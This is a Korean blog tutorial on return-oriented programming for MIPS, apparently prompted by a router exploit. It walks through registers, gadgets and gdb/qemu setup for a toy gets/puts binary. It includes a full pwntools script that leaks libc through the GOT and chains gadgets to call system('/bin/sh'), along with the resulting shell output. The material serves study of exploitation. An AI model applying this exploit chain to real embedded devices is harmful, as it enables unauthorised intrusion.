---
title: Mips Simple ROP
date: 2019-03-26
---

이번에 공유기 익스 하면서 이 녀석이 mips였기 때문에.. 살짝 정리해 둔다.

일단 예전에 arm 문제가 나오거나 하면 어찌할 줄 몰랐는데 이젠 잘 될듯 하다

크로스 컴파일 환경

> apt-get install gcc-multilib-mips-linux-gnu

기본은 이거고 추가로 많으니 자기가 원하는 것  설치하면 된다.

> mips-linux-gnu-gcc -o file file.c
>
> qemu-mips

이 두가지로 컴파일과 실행을 시켜볼 수 있다. qemu 같은 경우 -L /lib/mips-linux-gnu로 라이브러리 지정해 주면 되고 -g로 gdb로 어태치 시킬 수 있다.

```c
.text:004007C0                 addiu   $sp, -0x88
.text:004007C4                 sw      $ra, 0x88+var_4($sp)
.text:004007C8                 sw      $fp, 0x88+var_8($sp)
.text:004007CC                 move    $fp, $sp
.text:004007D0                 li      $gp, 0x419010
.text:004007D8                 sw      $gp, 0x88+var_78($sp)
.text:004007DC                 addiu   $v0, $fp, 0x88+var_70
.text:004007E0                 move    $a0, $v0         # s
.text:004007E4                 la      $v0, gets
.text:004007E8                 move    $t9, $v0
.text:004007EC                 jalr    $t9 ; gets
.text:004007F0                 nop
.text:004007F4                 lw      $gp, 0x88+var_78($fp)
.text:004007F8                 addiu   $v0, $fp, 0x88+var_70
.text:004007FC                 move    $a0, $v0         # s
.text:00400800                 la      $v0, puts
.text:00400804                 move    $t9, $v0
.text:00400808                 jalr    $t9 ; puts
.text:0040080C                 nop
.text:00400810                 lw      $gp, 0x88+var_78($fp)
.text:00400814                 move    $v0, $zero
.text:00400818                 move    $sp, $fp
.text:0040081C                 lw      $ra, 0x88+var_4($sp)
.text:00400820                 lw      $fp, 0x88+var_8($sp)
.text:00400824                 addiu   $sp, 0x88
.text:00400828                 jr      $ra
.text:0040082C                 nop
```

간단한 바이너리로 간단한 rop를 해봤다 그냥 gets, puts 인데 이 녀석은 어셈으로만 봐야하기 때문에 분석하기가 좀 힘들다..

인텔에서 자주보던 push ebp 요런게 없고 바로 sp에서 공간을 비운다. 그리고 0x88_var_4 이런식으로 나오는데 그냥 0x88 - 4 한 값 (왜 저렇게 나오는지..)

```c
addiu $a,$b $a 를 $b(+-) 만큼 더함
sw $a,$sp(+-) $a의 값을 $sp+- 에 save word(word로 저장)
lw $a,$b $b안의 값을 $a에 넣음 load word
li constant 를 load
la string을 load
move $a,$b 는 $b를 $a로 이동
jr intel의 jmp와 같음
jalr $t9 <-- 이녀석이 제일 중요한데 함수 호출이다 가젯을 쓸 때 ra는 웬만하면 건드리기 힘들기 때문에 이녀석을 사용해서 원하는 함수를 호출해야함
```

복잡한 바이너리는 보기 힘들긴 하지만 하나하나 찾아가면서 보면 엄~청 어렵진 않다. 

```c
레지스터
v0~v1 : 함수의 리턴 값이라고 하는 것 같음..(자세히 보지 않았다 ㅠ)
a0~a3 : 함수의 인자로 사용되는 녀석들
s0~s7 : 뭔가 계속 저장되는 레지스터인데 이 레지스터에서 왔다갔다를 많이 함 함수가 호출되는 도중에 불변 하기 때문에 함수가 끝나고도 어떻게든 가젯을 엮어볼 수 있다
t0~t8 : 약간 뭔가.. 그냥 임시버퍼 같은 느낌 
t9 : 함수 호출전에 t9에 함수 주소가 들어가게 되면서 jalr t9로 함수 호출
gp : 글로벌 포인터라고 하는데 string 혹은 함수들을 여길 기반으로 찾는다
sp : 스택 포인터
fp : 프레임 포인
ra : 리턴 주소
zero : 제로 레지스터인데 무조건 0이다. 뭔가를 0으로 만들때 항상 얘로 만든다
```

레지스터를 너무 많이 써서 기분이 좋지 않다. mips가 좋지 못한건 ret란게 없단점.. rop할 때 체이닝을 하기가 생각보다 어렵다.. 바이너리자체에 쓸만한 코드가 없다면 많이 제한적이다. 

>gdb.execute('set arch mips')
>gdb.execute('set endian big')
>gdb.execute('gef-remote -q localhost:8888')
>gdb.execute('symbol-file test')

gdb에선 대략 저런 옵션으로 세팅하고 실행하면 된다(gef 기준)

```python
from pwn import *
import sys

#if (sys.argv[1]):
#
t = process(['qemu-mips','-L','/usr/mips-linux-gnu/','./test'])
#else :
#t = process(['qemu-mips','-L','/usr/mips-linux-gnu/','-g','8888','./test'])

puts_got = 0x41105c
setting_s = 0x004008b0
call = 0x00400890
setting_a0 = 0x004008A4

def b(data):
	return p32(data,endian='big')

def unp(data):
	return u32(data,endian='big')

t.sendline("a"*108 + b(setting_s) + "a"*(52-24) + b(puts_got-4) + b(puts_got-1) + b(puts_got)*4 + b(setting_a0) + "a"*52 + b(0x004007c0)) 

t.recvuntil("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n")

puts = unp(t.recv(4).ljust(4,'\x00'))
print hex(puts)

libc = puts - 0x66570
system = libc + 0x3ebc4
binsh = libc + 0x00153D44
libc_gadget = libc + 0x00136F14
set_s = libc+0x00136EE4

sleep(1)

t.sendline("a"*(108) + b(set_s) + "a"*(0x48-40) + b(puts_got+0x8) + b(binsh) + b(puts_got) + b(system)*3 + b(puts_got+0x8)*3 + b(libc_gadget))

t.interactive()
```

익스 코드 

bin endian이라서 기존과 반대로 넣어줘야한다.. libc 릭이 된다면 libc안에 수 많은 가젯을 쓸 수 있다.

일단 맨처음 ra는 0x4008b0

>.text:004008B0                 lw      $ra, 0x38+var_4($sp)
>.text:004008B4                 lw      $s5, 0x38+var_8($sp)
>.text:004008B8                 lw      $s4, 0x38+var_C($sp)
>.text:004008BC                 lw      $s3, 0x38+var_10($sp)
>.text:004008C0                 lw      $s2, 0x38+var_14($sp)
>.text:004008C4                 lw      $s1, 0x38+var_18($sp)
>.text:004008C8                 lw      $s0, 0x38+var_1C($sp)
>.text:004008CC                 jr      $ra                                                                                                          .text:004008D0                 addiu   $sp, 0x38

여기서 s 레지스터들에 값을 세팅해준다 오버플로가 나면 순서대로 s~ ra까지 덮을 수 있게 된다.

그리고 다음 ra는

>.text:004008A4                 move    $a0, $s3
>.text:004008A8                 bne     $s1, $s2, loc_400890
>.text:004008AC                 addiu   $s0, 4
>.text:004008B0
>.text:004008B0 loc_4008B0:                              # CODE XREF: __libc_csu_init+58↑j
>.text:004008B0                 lw      $ra, 0x38+var_4($sp)
>.text:004008B4                 lw      $s5, 0x38+var_8($sp)
>.text:004008B8                 lw      $s4, 0x38+var_C($sp)
>.text:004008BC                 lw      $s3, 0x38+var_10($sp)
>.text:004008C0                 lw      $s2, 0x38+var_14($sp)
>.text:004008C4                 lw      $s1, 0x38+var_18($sp)
>.text:004008C8                 lw      $s0, 0x38+var_1C($sp)
>.text:004008CC                 jr      $ra
>.text:004008D0                 addiu   $sp, 0x38

이렇게 된다 a0에 원하는 값을 넣어 주고 loc_400890을 뛰면

>.text:00400890                 lw      $t9, 0($s0)
>.text:00400894                 addiu   $s1, 1
>.text:00400898                 move    $a2, $s5
>.text:0040089C                 move    $a1, $s4
>.text:004008A0                 jalr    $t9

puts_got를 인자로 puts를 호출할 수 있게 된다. 호출 후에 다시 쭉 명령어가 이어지면 ra로 점프하기 때문에 다시 main으로 돌려준다.

libc에서 가젯은 

>.text:00136EE4                 lw      $ra, 0x48+var_4($sp)
>.text:00136EE8                 lw      $fp, 0x48+var_8($sp)
>.text:00136EEC                 lw      $s7, 0x48+var_C($sp)
>.text:00136EF0                 lw      $s6, 0x48+var_10($sp)
>.text:00136EF4                 lw      $s5, 0x48+var_14($sp)
>.text:00136EF8                 lw      $s4, 0x48+var_18($sp)
>.text:00136EFC                 lw      $s3, 0x48+var_1C($sp)
>.text:00136F00                 lw      $s2, 0x48+var_20($sp)
>.text:00136F04                 lw      $s1, 0x48+var_24($sp)
>.text:00136F08                 lw      $s0, 0x48+var_28($sp)
>.text:00136F0C                 jr      $ra
>.text:00136F10                 addiu   $sp, 0x48
>.text:00136F14  # ---------------------------------------------------------------------------
>.text:00136F14
>.text:00136F14 loc_136F14:                              # CODE XREF: sub_136CA0+88↑j
>.text:00136F14                                          # sub_136CA0+C0↑j ...
>.text:00136F14                 lw      $a1, 0($s0)
>.text:00136F18                 move    $a0, $s1
>.text:00136F1C                 lw      $a2, 0($s7)
>.text:00136F20                 move    $t9, $s3
>.text:00136F24                 jalr    $t9

먼저 s 레지스터와 ra에 값 세팅 해주고 ra는 00136F14로 설정해서 쉘을 딸 수 있다.. 아니면 addiu와 move를 잘 이용하면 쉘코드도 실행시킬 수 있다(임베디드 리눅스에서 nx와 canary가 설정되있지 않은 바이너리는 상당히 많다고 한다.)

```c
bskim@bsbuntu:~/mips$ python test.py
[+] Starting local process '/usr/bin/qemu-mips': pid 27358
0x766a0570
[*] Switching to interactive mode
vi�@
$  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaavw\x0e�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
$ id
uid=1000(bskim)
```

인텔에 비하면 복잡..